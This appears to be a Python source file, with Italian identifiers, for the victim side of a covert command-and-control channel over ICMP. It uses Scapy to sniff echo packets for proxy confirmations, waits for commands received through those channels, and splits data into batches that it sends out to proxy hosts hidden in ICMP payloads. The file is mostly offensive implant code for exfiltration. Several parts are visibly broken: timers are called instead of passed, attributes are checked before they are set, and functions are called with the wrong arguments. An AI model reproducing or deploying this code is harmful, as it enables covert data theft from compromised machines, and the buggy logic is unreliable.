import ipaddress
import threading 
from scapy.all import AsyncSniffer, Raw, IP, ICMP
from Programma.classes import HOST_CONNESSI
from Programma.attack.attack_classes import _IPx
from Programma.attack.singleton import ReceiveSingleton, SendSingleton
from Programma.classes.entity import Victim
from Programma.config import DEBUG, WAITING_TIME, type_sender, use_delay 
from Programma.custom_enum import ATTACK_TYPE, EXIT_CASES, ICMP_TYPE, MSG, SENDER_TYPE
from Programma.methods.check_type import is_AsyncSniffer, is_enum_member, is_integer, is_ipaddress, is_list, is_string, is_threading_Event, is_threading_Lock, is_threading_Timer
from Programma.methods.get_methods import get_AsyncSniffer, get_threading_Event, get_timer
from Programma.methods.network_methods import default_interface
from Programma.methods.utils_methods import ask_bool_choice, threadEvent_set, threadEvent_wait 


class THREAD_VICTIM: 
    class WAIT_CONNECTIONS: 
        def __init__(self, vittima:Victim=None, num_connessioni:int=0, connected_proxy:HOST_CONNESSI=None):
            if not isinstance(vittima, Victim): 
                raise TypeError("non oggetto Victim->",type(vittima)) 
            self.vittima=vittima 
            if not is_integer(num_connessioni) or num_connessioni<0: 
                raise TypeError("numero non valido->",num_connessioni) 
            self.num_connessioni=num_connessioni
            if not isinstance(connected_proxy, HOST_CONNESSI): 
                raise TypeError("List host connessi non valida:",connected_proxy)
            self.connected_proxy=connected_proxy
            self.stop_flag={"value":False} 
        
        def start(self,ip_host): 
            def callback_timer(): 
                self.connected_proxy.lock.acquire() 
                #is_enough_proxy=len(connected_proxy.proxy_list) >= num_proxy 
                proxy_necessari=self.num_connessioni-len(self.connected_proxy.proxy_list)
                self.connected_proxy.lock.release()
                if proxy_necessari>0: 
                    msg="Numero minimo di connessioni non raggiunto.\nContinuare ad aspettare ulteriormente? (s/n) " 
                    if ask_bool_choice(msg): 
                        print("Continuo ad aspettare...") 
                        self.timer.cancel() 
                        self.timer=get_timer(WAITING_TIME, callback_timer())  
                        self.timer.start() 
                        return
                    else: print("Smetto di aspettare...") 
                else:print("Numero minimo di connessioni raggiunto") 
                #self.stop_flag["value"]=True 
                threadEvent_set(self.event_enough_proxy) 
            def get_sniffer(): 
                interface=default_interface() 
                if interface is None: 
                    raise ValueError("interface is None",interface) 
                print("Monitoring interface->",interface) 
                sniff_args={
                    "filter": get_filter() 
                    ,"prn":get_pkt_callback()
                    #,"store":False 
                    ,"iface":interface
                } 
                return get_AsyncSniffer(sniff_args) 
            def get_filter(): 
                if not is_ipaddress(ip_host): 
                    raise TypeError("ip_host non valido")  
                IPv4_ECHO_REQUEST= ICMP_TYPE.v4_Echo_Request if ip_host.version==4 else ICMP_TYPE.v6_Echo_Request
                IPv4_ECHO_REPLY= ICMP_TYPE.v4_Echo_Reply if ip_host.version==4 else ICMP_TYPE.v6_Echo_Reply
                if ip_host.version==4: 
                    icmp="icmp " 
                elif ip_host.version==6: 
                    icmp="icmp6 " 
                filter= icmp #if not DEBUG else f"({icmp} or tcp)" 
                filter+=f" and ({icmp}[0]=={IPv4_ECHO_REQUEST} or {icmp}[0]=={IPv4_ECHO_REPLY}) "  
                filter+=f" and dst {ip_host.compressed}"
                return filter 
            def get_pkt_callback(): 
                def pkt_callback(packet): 
                    #print(packet.summary()) 
                    if not packet.haslayer(IP) or not packet.haslayer(ICMP) or not packet.haslayer(Raw): 
                        print("Livello IP, ICMP o Raw non presente nel pacchetto") 
                        return 
                    #else: print("Pacchetto accettato")
                    try:
                        ip_src=ipaddress.ip_address(packet[IP].src) 
                    except Exception as e: 
                        return 
                    self.connected_proxy.lock.acquire() 
                    is_already_connected= ip_src in self.connected_proxy.proxy_list
                    self.connected_proxy.lock.release()  
                    if is_already_connected:  
                        print(f"Host {ip_src} gia connesso...:")
                        return  
                    else: print(f"Host {ip_src} non connesso") 
                    confirm_text=MSG.CONFIRM_PROXY.value+ip_host.compressed 
                    if confirm_text not in packet[Raw].load.decode(): 
                        print("Connessione non confermata")
                        return 
                    str_attacco=packet[Raw].load.decode().replace(confirm_text,"")  
                    attack_function=ATTACK_TYPE.get_attack_method(str_attacco) 
                    print("Tipologia di attacco ricevuto:",attack_function) 
                    if not is_enum_member(attack_function,ATTACK_TYPE): 
                        print("Attacco non valido:",attack_function) 
                        return
                    self.connected_proxy.lock.acquire() 
                    self.connected_proxy.type_attack[ip_src.compressed]=attack_function 
                    self.connected_proxy.lock.release() 
                    print("Tipologia di attacco ricevuto:",self.connected_proxy.type_attack[ip_src.compressed]) 
                    msg_conferma=( 
                        MSG.CONFIRM_VICTIM.value+
                        ip_host.compressed+
                        ip_src.compressed+ 
                        self.connected_proxy.type_attack[ip_src.compressed].name
                    )  
                    try:  
                        SendSingleton(
                            ATTACK_TYPE.ipv4_echo_payload, 
                            SENDER_TYPE.SENDER_TRUE_SENDER, 
                            use_delay=False
                        ).send_data(msg_conferma.encode(), ip_src) 
                        print("Conferma inviata a:",ip_src)  
                        self.connected_proxy.lock.acquire() 
                        if ip_src not in self.connected_proxy.proxy_list:
                            self.connected_proxy.proxy_list.append(ip_src) 
                            print("Proxy aggiunto alla lista")
                        else: print("Proxy già presente") 
                        proxy_necessari=self.num_connessioni-len(self.connected_proxy.proxy_list)
                        self.connected_proxy.lock.release() 
                        if proxy_necessari<=0: # and ask_bool_choice(msg)
                            threadEvent_set(self.event_enough_proxy) 
                            self.stop_flag["value"]=True 
                    except Exception as e: 
                        print(e) 
                        print(f"Connessione non confermata. {ip_src} non aggiunto alla lista") 
                return pkt_callback 
            #-------------------------------------------
            if not is_list(self.connected_proxy.proxy_list): 
                raise TypeError("proxy_list non valido") 
            if not is_threading_Lock(self.connected_proxy.lock): 
                raise TypeError("ip_host non valido")  
            if not is_ipaddress(ip_host): 
                raise TypeError("ip_host non valido") 
            self.event_enough_proxy=get_threading_Event() 
            if not is_threading_Event(self.event_enough_proxy): 
                raise TypeError("non threading.Event",type(self.event_enough_proxy)) 
            self.timer:threading.Timer=get_timer(
                WAITING_TIME, 
                lambda:callback_timer()
            ) 
            if not is_threading_Timer(self.timer): 
                raise TypeError("non è threading.Timer",type(self.timer)) 
            sniffer:AsyncSniffer=get_sniffer()
            if not is_AsyncSniffer(sniffer): 
                raise TypeError("non AsyncSniffer",type(sniffer)) 
            self.timer.start() 
            if self.timer.is_alive():
                print("Timer started...") 
            else: raise RuntimeError("Timer not started...") 
            sniffer.start() 
            if sniffer.running:
                print("Sniffer started...") 
            else: raise RuntimeError("Sniffer not started...") 
            print("Waiting thread to end...") 
            threadEvent_wait(self.event_enough_proxy) 
            if self.timer.is_alive(): 
                self.timer.cancel()
                print("Timer stopped...") 
            sniffer.stop()
            if sniffer.running: 
                raise RuntimeError("SNIFFER NOT STOPPED:",sniffer.running)
            print("Sniffer stopped...") 

    class WAIT_COMMAND: 
        def __init__(self, attack_function, ip_host):
            if not is_enum_member(self.attack_function,ATTACK_TYPE): 
                raise TypeError("attack_function non ATTACK_TYPE") 
            self.attack_function=attack_function
            if not is_ipaddress(self.ip_host): 
                raise TypeError("ip_host non valido")  
            self.ip_host=ip_host

        def start(self):  
            print("Waiting command tramite:",self.attack_function) 
            wait_class=ReceiveSingleton(self.attack_function).wait_class
            if not isinstance(wait_class, _IPx):  
                raise TypeError("wait_class non valida") 
            if DEBUG: 
                msg="Inserisci il comando: " 
                comando=input(msg) 
            else: 
                wait_class.wait() 
                print("Received data") 
                comando=wait_class.data 
            if not is_string(comando): 
                raise TypeError("comando non stringa",type(comando))  
            print("Command received:",comando) 
            if any(case in comando for case in [e.value for e in EXIT_CASES]): 
                raise ValueError("Comando per interruzione del programma") 
            self.comando=comando

    class SEND_DATA: 
        def __init__(self, vittima:Victim=None, data:str=None):
            def divide_proxy_data(): 
            #def send_data_to_proxies(data_to_send:list, connected_proxy:list[ipaddress.IPv4Address], attack_function:dict): 
                proxy_data=[
                    [] for proxy in vittima.connected_proxy.proxy_list 
                ] 
                #if DEBUG: 
                #    print("DEBUG: send_data -> proxy_data")
                #    proxy_data=[[],[],[],[],[]] 
                #print("PROXY DATA:",proxy_data)
                batch_size=int(1024/(2*2)) #256 bytes 
                batch_number=int(len(data)/batch_size)+1
                for index in range(batch_number): 
                    print("INDEX",index) 
                    start=index*batch_size
                    end=index*batch_size+batch_size 
                    proxy_data[index%len(proxy_data)].append(str(index)+MSG.SEPARATORE_INDEX_DATA.value+data[start:end])  
                #print("WWWW")
                #for proxy_batch in proxy_data: 
                #    print("AAA",len(proxy_batch))
                #    for batch in proxy_batch: 
                #        print(batch,end="\t") 
                #    print("\n")
                #print("WWWW") 
                for proxy_index in range(len(proxy_data)): 
                    proxy_batch=proxy_data[proxy_index]
                    if len(proxy_batch)<=0: 
                        continue 
                    new_data="".join(
                        proxy_batch[index] if index==0 
                        else MSG.SEPARATORE_BATCH.value+proxy_batch[index] 
                        for index in range(len(proxy_batch))
                    ) 
                    print("NEW DATA",len(new_data),new_data)
                    proxy_data[proxy_index]=new_data 
                #print("SSSS")
                #for proxy_batch in proxy_data: 
                #    print("AAA",len(proxy_batch),proxy_batch) 
                #print("SSSS") 
                return proxy_data
            def send_data(data:str=None, proxy:ipaddress=None, attack_function:ATTACK_TYPE=None): 
                if not is_string(data) or not is_ipaddress(proxy) or not is_enum_member(attack_function, ATTACK_TYPE): 
                    raise TypeError("IP host, Dato oppure Attack non validi") 
                if  data.strip()=="":  
                    send_last_packet(proxy) 
                    return 
                print("DATA",data)
                print("PROXY",proxy) 
                print("ATTACK",attack_function)  
                SendSingleton(
                    attack_function, 
                    type_sender, 
                    use_delay 
                ).send_data(data.encode(), proxy) 
                send_last_packet(proxy) 
                #unavailable_proxy=send_last_packet() 
            def send_last_packet(proxy:ipaddress=None): 
                if not is_ipaddress(proxy): 
                    raise TypeError("IP host non valido")  
                print("SEND LAST PACKET:",proxy) 
                try: 
                    data=MSG.LAST_PACKET.value  
                    SendSingleton(
                        self.attack_function, 
                        type_sender, 
                        use_delay 
                    ).send_data(data.encode(), proxy) 
                except Exception as e: 
                    print(e)
                    print("LAST PACKET NON ARRIVATO:",proxy)   
            #--------------------------- 
            if not is_string(data): 
                raise ValueError("Dati non stringa",data) 
            if not isinstance(vittima, Victim): 
                raise TypeError("Vittima non valida")
            proxy_data=divide_proxy_data(data) 
            if not is_list(proxy_data): 
                raise TypeError("proxy_data non lista") 
            if all(not is_string(stringa) for stringa in proxy_data): 
                raise TypeError("data non string",type(proxy_data)) 
            print("PROXY DATA",proxy_data) 
            print("LEN PROXY DATA",len(proxy_data))
            print("Sending data...") 
            for index in range(len(proxy_data)):
                if DEBUG: 
                    send_data(proxy_data[index], vittima.ip_host, ATTACK_TYPE.ipv4_destination_unreachable)  
                else: 
                    send_data(proxy_data[index], vittima.connected_proxy.proxy_list[index], vittima.connected_proxy.type_attack[index]) 
